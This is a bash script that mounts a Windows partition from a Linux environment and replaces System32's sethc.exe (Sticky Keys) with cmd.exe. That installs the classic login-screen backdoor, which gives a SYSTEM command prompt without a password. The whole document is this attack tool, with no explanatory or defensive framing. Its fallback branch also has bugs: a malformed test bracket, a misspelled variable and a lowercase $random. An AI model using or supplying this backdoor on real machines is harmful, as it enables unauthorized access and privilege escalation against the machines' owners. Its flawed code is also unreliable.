beans=0
sethcrekd=0
while [ $beans == 0 ]; 
do
	fdisk -l
	echo Select device block
	read deviceblk
	mkdir /winmount
	mount /dev/$deviceblk /winmount
	cd /winmount
	win=$(ls | grep -i windows)
	sys=$(ls $win | grep -i system32)
	ls -la $win/$sys/sethc.exe
	if [ $? -eq 0 ]; then
		mv $win/$sys/sethc.exe $win/$sys/sethc$RANDOM.exe
		cp $win/$sys/cmd.exe $win/$sys/sethc.exe
		beans=1
		sethcrekd=1
	fi
	if [ $sethcrekd == 0]; then
		updatedb
		counts=$(locate sethc.exe | grep sethc.exe$ | wc -l)
		if [ $counts == 1 ]; then
			sethcdir=$(locate sethc.exe | grep sethc.exe$)
			sysdir=$(echo $sethdcir | sed 's/sethc.exe//g')
			mv $sysdir/sethc.exe $sysdir/sethc$random.exe
			cp $sysdir/cmd.exe $sysdir/sethc.exe
			beans=1
			sethcrekd=1
		fi
		if [ $counts == 0 ]; then
			echo No sethc.exe found. Sorry.
		fi
	fi
done
